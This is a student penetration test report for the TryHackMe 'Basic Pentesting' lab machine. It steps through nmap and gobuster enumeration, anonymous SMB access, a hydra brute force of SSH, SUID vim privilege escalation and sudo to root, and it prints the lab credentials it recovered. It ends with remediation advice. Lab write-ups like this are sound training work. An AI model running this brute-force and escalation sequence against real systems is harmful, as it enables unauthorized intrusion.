# Offensive Security

## Penetration Test Report

**Student Name:** Sanin  
**Date:** *(Add today's date here)*

---

## Table of Contents
1. [Objective](#1-objective)  
2. [Methodology](#2-methodology)  
3. [Executive Summary](#3-executive-summary)  
4. [Detailed Findings](#4-detailed-findings)  
   - [Initial Reconnaissance](#initial-reconnaissance)  
   - [Web Enumeration](#web-enumeration)  
   - [SMB Enumeration](#smb-enumeration)  
   - [Brute-force and SSH Access](#brute-force-and-ssh-access)  
   - [Privilege Escalation](#privilege-escalation)  
   - [Flags](#flags)  
5. [Screenshots](#5-screenshots)  
6. [Recommendations](#6-recommendations)  
7. [Conclusion](#7-conclusion)

---

## 1. Objective
The purpose of this penetration test is to evaluate the security posture of the target machine **Basic Pentesting** (`10.10.21.109`) using a gray box testing methodology. The test was performed by Sanin on a TryHackMe lab environment. The goal is to identify, exploit, and document any security vulnerabilities found.

---

## 2. Methodology
The assessment followed a typical gray box penetration testing methodology, including the following steps:

1. Reconnaissance and Enumeration  
2. Vulnerability Identification  
3. Exploitation  
4. Privilege Escalation  
5. Post Exploitation  
6. Reporting

**Tools Used:**
- nmap
- gobuster
- smbclient
- hydra
- ssh
- vim

---

## 3. Executive Summary
The target machine was compromised using a combination of poor configurations, weak passwords, and exposed services. The following issues were identified:

- Weak SSH credentials for a valid user
- Insecure SMB share accessible anonymously
- Exposed backup file containing plaintext password
- Privilege escalation via SUID-enabled `vim`

Full root access was achieved during the engagement.

---

## 4. Detailed Findings

### Initial Reconnaissance
**Command Used:**
```
nmap -sC -sV -oN nmap.txt 10.10.21.109
```

**Open Ports:**
- 22 (SSH)
- 80 (HTTP)
- 139, 445 (SMB)
- 8009, 8080 (Apache Tomcat)

> *[Screenshot Placeholder]*

### Web Enumeration
**Command Used:**
```
gobuster dir -u http://10.10.21.109/ -w /usr/share/wordlists/dirb/common.txt
```

**Directories Found:**
- `/development`
- `/index.html`

**Interesting Files:**
- `dev.txt`
- `j.txt`

> *[Screenshot Placeholder]*

### SMB Enumeration
**Commands Used:**
```
smbclient -L //10.10.21.109
smbclient //10.10.21.109/Anonymous
```

**Share Accessed:** `Anonymous` (No credentials required)

> *[Screenshot Placeholder]*

### Brute-force and SSH Access
**Command Used:**
```
hydra -l jan -P passlist 10.10.21.109 ssh
```

**Credentials Found:**
- Username: `jan`
- Password: `armando`

**SSH Access:**
```
ssh jan@10.10.21.109
```

User `jan` is **not** in the sudoers group.

> *[Screenshot Placeholder]*

### Privilege Escalation
**SUID Binary Check:**
```
find / -perm -4000 2>/dev/null
```

**Used SUID `vim` to read another user's files**
- Discovered user `kay`
- Found file: `/home/kay/pass.bak`
- Read password using: `vim pass.bak`

**Kay's Password:**
```
heresareallystrongpasswordthatfollowsthepasswordpolicy$$
```

**Switched User:**
```
su kay
```

**Checked sudo permissions:**
```
sudo -l
```

**Output:** User `kay` can run ALL commands

**Privilege Escalation:**
```
sudo su
```


---

## 6. Recommendations
- Remove or restrict SUID permission from unnecessary binaries like `vim`.
- Enforce strong password policies and lockout mechanisms.
- Avoid storing plaintext passwords in user directories.
- Limit `sudo` privileges to only necessary users and commands.
- Properly secure and limit access to shared SMB folders.

---

## 7. Conclusion
The target machine was successfully compromised using multiple known attack vectors. The security flaws identified—such as weak passwords, poor access control, and exposed sensitive files—should be addressed immediately to prevent real-world attacks.

---

*Report prepared by Sanin for cybersecurity training and interview assessment purposes.*
